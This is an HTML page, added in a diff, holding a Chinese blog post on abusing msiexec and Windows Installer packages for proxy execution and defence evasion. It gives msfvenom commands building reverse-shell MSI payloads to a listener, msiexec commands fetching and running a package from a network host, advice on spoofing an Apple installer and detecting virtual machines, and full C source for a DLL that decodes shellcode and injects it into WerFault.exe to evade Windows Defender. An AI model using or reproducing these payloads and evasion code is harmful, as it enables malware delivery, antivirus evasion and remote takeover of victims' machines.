@@ -1,0 +1,1485 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Windows Installer安装包的构建和执行, Yang Hao&#39;s blog">
+    <meta name="description" content="Yang Hao&#39;s blog">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-KYC8PY5RS4');
+</script>
+
+
+    <title>Windows Installer安装包的构建和执行 | Yang Hao&#39;s blog</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/css/lightgallery.min.css">
+	
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/my.css">
+	
+	<!--prism-->
+	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.css">
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.js" async ></script>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/jquery/jquery.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/live2d-widget/autoload.js"></script>
+<meta name="generator" content="Hexo 5.4.2">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Yang Hao's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Yang Hao&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="javascript:void(0);" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>文章</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>分类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>归档</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Yang Hao&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Yang Hao&#39;s blog
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			文章
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:28px" ></i>
+			      
+		          <span>标签</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:28px" ></i>
+			      
+		          <span>分类</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:50px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:28px" ></i>
+			      
+		          <span>归档</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/7.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Windows Installer安装包的构建和执行</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Proxy-Execution/">
+                                <span class="chip bg-color">Proxy Execution</span>
+                            </a>
+                        
+                            <a href="/tags/Msiexec/">
+                                <span class="chip bg-color">Msiexec</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Defense-Evasion/" class="post-category">
+                                Defense Evasion
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-08-31
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2026-08-31
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    9 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Msiexec是Windows上从命令行执行Windows Installer安装、修改、卸载等操作的工具。Msiexec存在一个Windows Installer服务以便在需要的时候进行调用，服务中将Msiexec描述为添加、修改和删除作为 Windows Installer 程序包(.msi、.msp)提供的应用程序。二进制文件为msiexec.exe，默认存在于<code>C:\Windows\System32\</code>目录下且默认存在于系统环境变量中，可通过命令行调用。<br>msiexec.exe属于系统文件，并且可用于加载恶意msi文件获得代码执行能力，所以经常也被用来进行基于系统文件白名单的代理执行。</p>
+<h2 id="0x02-MSI文件构建和执行"><a href="#0x02-MSI文件构建和执行" class="headerlink" title="0x02 MSI文件构建和执行"></a>0x02 MSI文件构建和执行</h2><p>在利用msiexec进行代理执行时，需要先构建MSI文件，在没有其他需求的情况下，可以使用metasploit快速生成msi安装包：</p>
+<pre><code>#生成msi类型的载荷
+msfvenom -a x64 -p windows/x64/shell/reverse_tcp LHOST=192.168.11.1 LPORT=8888 -f msi -o rev_x64_8888.msi
+#生成msi-nouac类型的载荷
+msfvenom -a x64 -p windows/x64/shell/reverse_tcp LHOST=192.168.11.1 LPORT=8888 -f msi-nouac -o rev_x64_8888msi-nouac.msi
+#开启监听
+handler -p windows/x64/shell/reverse_tcp -H 0.0.0.0 -P 8888
+</code></pre>
+<p>生成后安装方式除了在可视化界面安装，还可以通过msiexec命令行执行本地或网络上的msi安装包获得代码执行：</p>
+<pre><code>msiexec /q /i MsiexecSetup.msi
+msiexec /q /i http://192.168.11.1/MsiexecSetup.msi
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/bdf954d699d25571d9e3862961106356.png"></p>
+<p>这里是使用msiexec命令加载msi安装包执行的简单用例，这在一些存在命令执行漏洞的位置可以发挥一定的效果。</p>
+<h3 id="0x2-1-Visual-Studio的MSI扩展"><a href="#0x2-1-Visual-Studio的MSI扩展" class="headerlink" title="0x2-1 Visual Studio的MSI扩展"></a>0x2-1 Visual Studio的MSI扩展</h3><p>上文介绍了使用Metasploit简单生成msi安装包的方式，实际利用中需要定制化载荷执行，可以通过Visual Studio扩展Microsoft Visual Studio Installer Projects来生成MSI安装包(或InstallShield、Advanced Installer等工具)。通过该扩展可以自定义设置要执行的二进制或脚本文件，这些二进制和脚本文件都可以进行定制开发嵌入到MSI安装包中，扩展安装方式比较简单，操作如下：</p>
+<p>在扩展里联机搜索: <code>Microsoft Visual Studio Installer Projects</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/da9a9cb599c8d747fe7fd1505ff4be19.png"></p>
+<p>安装完成后重启VS,新建项目时搜索 Setup Project 选择项目模板：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/20e799f09417f387745299874bd0d22e.png"></p>
+<p>在MSI安装包项目中，可以设置安装程序在目标主机上执行的文件、注册表、快捷方式等操作：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/2791af7d0ee7fab11125d78b9cb432e6.png"></p>
+<p>其中主要就是利用文件系统和自定义操作选项，可以设置将在目标主机上释放的文件和执行的命令：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/040c254443619387b1ae90ba05dc2add.png"></p>
+<p>在文件系统选项中选择要添加的文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/6cf9e7398d99926610f0dfbd67d4cc2d.png"></p>
+<p>自定义选项中可以设置在安装、修复、回滚、卸载阶段执行的命令：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/6cf9e7398d99926610f0dfbd67d4cc2d.png"></p>
+<h4 id="0x2-1-1-MSI安装包属性设置"><a href="#0x2-1-1-MSI安装包属性设置" class="headerlink" title="0x2-1-1 MSI安装包属性设置"></a>0x2-1-1 MSI安装包属性设置</h4><p>在扩展中可以对安装包的属性进行设置，部分属性会在msi文件的详细信息中体现，所以可以对属性进行一些伪造欺骗：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/69918438f3405be97525473e65465d82.png"><br>伪造一个Apple的安装包:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/d8f3e6fc4cdb3c7a92eae9fc4453c74c.png"><br>一些开发者属性信息会自动用于应用目录的设置:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/b677e0595f9177d8b38f397677127cfd.png"><br>属性中有一个 installAllUsers 属性，将其设为True时，在管理员权限下msiexec会使用SYSTEM权限执行安装:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/5fbc011167e57a48576a6d4848fe7c7a.png"><br>在属性中还可以设置图标(一个免费的图标获取网站：<a target="_blank" rel="noopener" href="https://icons8.com/app/windows">https://icons8.com/app/windows</a>  )：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/4a531b66566dfca8bfcbde7ec1e45e79.png"><br>图标设置后会在控制面板程序中看到：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/3d3108d8a8af9d005140201405a19daa.png"><br>其他msi安装包中的图标可以通过 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/msi/orca-exe">Orca</a> 工具(SDK中的安装包名为Orca-x86_en-us.msi)中的<code>Tables-Export Tables</code>功能提取文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/3d3b0a2f3dae5e993c688f68854c90b7.png"><br>更多的属性可参考微软文档:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/msi/property-reference?redirectedfrom=MSDN">property-reference</a> ,msi安装包的属性在下文设置执行条件时还会使用。</p>
+<h4 id="0x2-1-2-MSI安装包启动条件设置"><a href="#0x2-1-2-MSI安装包启动条件设置" class="headerlink" title="0x2-1-2 MSI安装包启动条件设置"></a>0x2-1-2 MSI安装包启动条件设置</h4><p>在项目view菜单中可以设置启动条件，用于检查当前执行环境是否可以继续安装:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/bec08063adfe13976fbd10211b2d4574.png"><br>这个配置中主要使用的是<code>Launch Conditions</code>来添加执行条件，根据上文参考链接中的属性，可以设置硬件属性中的内存、分辨率来检测虚拟机:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/2fe8b9886d5c7c518553148fd3f8e042.png"><br>执行效果：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/e25e0ac6acecbeec8d785130d054b868.png"><br>对于一些其他商业软件可进行的复杂条件设置，可以通过Orca查看然后学走：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/855034c386b60e601daca4c6d4a16d1e.png"><br>一些常见的条件设置可以参考<a target="_blank" rel="noopener" href="https://community.flexera.com/t5/InstallShield-Knowledge-Base/Common-MSI-Conditions/ta-p/3854">InstallShield</a>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/7d8c151b85ee3b6dbd31c4e703e2866b.png"><br>并且在安装时可以使用<code>msiexec /q /i MsiexecSetup.msi /log 123.log</code>方式输出日志文件，通过对比日志文件进行更详细的条件设置：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/8baf4e2062e0b46d8c05401ad59d125e.png"><br>并且可以注意到内存并不是标准的32GB(32768MB)数值，而是会略微偏小(32588MB)，这是一个需要注意的点。如果在测试过程中安装失败，也可以在日志中看到错误代码。错误代码的详细信息可以在官方文档中查询到:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-error-messages">windows-installer-error-messages</a></p>
+<h3 id="0x2-2-MSI中执行载荷"><a href="#0x2-2-MSI中执行载荷" class="headerlink" title="0x2-2 MSI中执行载荷"></a>0x2-2 MSI中执行载荷</h3><p>MSI安装包中可以添加exe、dll、vbs、js类型二进制文件或脚本。常用操作是通过文件系统管理添加要执行的文件，然后在自定义操作中设置在几个阶段要执行的文件。文件释放位置可以使用系统文件夹属性变量:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/51f89d859891113ca9e21696f22eb329.png"><br>在文件系统中可以新增自定义文件夹来使用不同的文件夹属性值，释放文件到Temp目录一定程度上可以规避安全软件:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/b29e4c0d48f88fcc5c74af4a90485f1f.png"><br>添加完成后，在自定义操作中设置在安装阶段执行文件，选择之前添加的文件位置:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/26ae33bd55db0358115b946bb28f796e.png"><br>设置文件的执行动作时，可以在属性栏中设置EXE文件启动参数、DLL文件入口函数:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/be54650d55e0bf74170ca6353258e4d1.png"><br>DLL文件的导出函数需要使用下列方式声明:</p>
+<pre><code>extern "C" __declspec(dllexport) UINT __stdcall Install(MSIHANDLE hInstall)
+{
+&nbsp;&nbsp;&nbsp; RunYourSteps();
+&nbsp;&nbsp;&nbsp; return ERROR_SUCCESS;
+}
+</code></pre>
+<p>另外需要注意的是可执行文件和msi安装包的Platform需要正确设置，在msi项目属性中(dll是64位的，msi对应属性也设置为64位)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/e1bdb94c2c16736e70bb87534efb70b8.png"><br>自定义操作中针对文件设置：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/6c005fa537dff7af4bf9126853f93a8b.png"><br>通过在msi安装程序中利用dll文件执行（xor还原stage payload后创建进程注入）绕过WinDefender静态扫描和动态查杀：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/60debd35e3ca934e0048a9c7d2221758.gif"></p>
+<h2 id="0x03-MSIEXEC加载DLL执行"><a href="#0x03-MSIEXEC加载DLL执行" class="headerlink" title="0x03 MSIEXEC加载DLL执行"></a>0x03 MSIEXEC加载DLL执行</h2><p>msiexec程序也可以加载DLL执行，前提是DLL文件在磁盘上存在并且是64位的。通过命令行调用DLL中的DllRegisterServer或DllUnRegisterServer导出函数:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/0d2ce0135a774994aeca7007bc2ff2e2.png"><br>命令行执行时需要注意文件路径:</p>
+<pre><code># DllUnRegisterServer
+msiexec /z C:\windows\tmp\run.dll
+# DllRegisterServer
+msiexec /y ..\..\..\windows\tmp\run.dll
+# 执行run.dll文件 DllRegisterServer
+msiexec /y ..\..\..\windows\tmp\run
+# 执行 .dll 文件 DllRegisterServer
+msiexec /y .\
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/9dc508e543dd293e564f25c6fc3a52cd.png"></p>
+<p>测试时发现在测试环境中<code>/z</code>参数不能触发DllUnRegisterServer的执行，这可以直接在dllmain函数中进行想要的操作:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/b8b2f42b2f931c32d1185391fc47344d.png"><br>这就可以自定义DLL后通过msiexec加载了。一般Windows会自带WinDefender安全软件，我们在Dllmain中简单判断下当前的物理内存大小，可以绕过它的模拟执行检测，简单Demo如下:</p>
+<pre><code class="line-numbers language-c">#include "pch.h"
+#include &lt;iostream&gt;
+#include &lt;tchar.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;msi.h&gt;
+#include &lt;msiquery.h&gt;
+#include &lt;sddl.h&gt;
+#pragma comment(lib, "Msi.lib")
+HMODULE g_hModule;
+BOOL Inject_Shellcode();
+BOOL SpawnProcess(char* runcmdline);
+
+BOOL PhysicalMemory() {
+    MEMORYSTATUSEX statex;
+    statex.dwLength = sizeof(statex);
+    GlobalMemoryStatusEx(&amp;statex);
+    DWORD PhysicalMem = 0;
+    BOOL rt = FALSE;
+    PhysicalMem = statex.ullTotalPhys / 1024 / 1024;
+    if (PhysicalMem &gt; 2022) {
+        rt = TRUE;
+    }
+    return rt;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
+{
+    g_hModule = hModule;
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
+        HANDLE Mutexlock = CreateMutexA(NULL, FALSE, "CreateMutexA-yanghaoi");
+        if (GetLastError() == ERROR_ALREADY_EXISTS)
+        {
+            if (Mutexlock != NULL) CloseHandle(Mutexlock);
+            Mutexlock = NULL;
+        }
+        else {
+            if (PhysicalMemory()) {
+                // MessageBox(NULL, "Hello Dllmain!", "MessageBox", MB_OK);
+                Inject_Shellcode();
+            }
+            return ERROR_SUCCESS;
+        }
+        return 0;
+    }
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+BOOL Inject_Shellcode()
+{
+    unsigned char hexData[927] = {
+        0xAE, 0x1A, 0x00 , // shellcode
+    };
+
+    DWORD size = sizeof(hexData);
+    unsigned char ar[sizeof(hexData)];
+    for (int i = 0; i &lt;= size - 1; i++)
+    {
+        ar[i] = hexData[i] ^ 0x52;
+    }
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    LPVOID lpMalwareBaseAddr;
+    LPVOID lpnewVictimBaseAddr;
+    HANDLE hThread;
+    BOOL bRet = FALSE;
+    DWORD dwOldProtect;
+    lpMalwareBaseAddr = ar;
+    ZeroMemory(&amp;si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&amp;pi, sizeof(pi));
+    char* Process = (char*)"C:\\Windows\\System32\\WerFault.exe";
+    if (CreateProcessA(NULL, Process, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi) == 0) { return bRet; }
+    lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (lpnewVictimBaseAddr == NULL) {
+        printf("[-] VirtualAllocEx error:%d\n", GetLastError());
+        if (!TerminateProcess(pi.hProcess, 0)) {
+            printf("[-] TerminateProcess error:%d\n", GetLastError());
+        }
+        return bRet;
+    }
+    WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr, (LPVOID)lpMalwareBaseAddr, size, NULL);
+    hThread = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);
+    WaitForSingleObject(pi.hThread, 2000);
+    if (NULL != pi.hProcess)
+    {
+        CloseHandle(pi.hProcess);
+    }
+
+    if (NULL != pi.hThread)
+    {
+        CloseHandle(pi.hThread);
+    }
+    return bRet;
+}
+
+BOOL SpawnProcess(char* runcmdline) {
+    printf("[*] runcmdline:%s\n", runcmdline);
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    si.wShowWindow = SW_HIDE;
+    ZeroMemory(&amp;si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&amp;pi, sizeof(pi));
+    if (!CreateProcessA(NULL, runcmdline, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)) { return FALSE; }
+    printf("[+] ProcessId：%d \n", pi.dwProcessId);
+    printf("[+] ThreadId：%d \n", pi.dwThreadId);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return TRUE;
+}
+</code></pre>
+<p>编译为x64的dll后，使用<code>msiexec /z .\Msiexec</code>在开启WinDefender的环境下执行:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/e6fb75288a5f92516d5c19daf0b1bd91.gif"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>文章对msi安装包的制作、载荷执行、命令执行方式进行了整理和实验，并对一些容易出现问题的地方进行了说明或提出解决方案。文章实现了在msi安装包中执行自定义程序，实现了msiexec命令执行dll和安全软件检测绕过。可以进行社工msi安装包制作、白名单命令代理执行等。</p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/007/">Signed Binary Proxy Execution</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec">msiexec-commands</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/msi/property-reference?redirectedfrom=MSDN">msi-property</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec">msiexec-hacker</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">YangHao</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
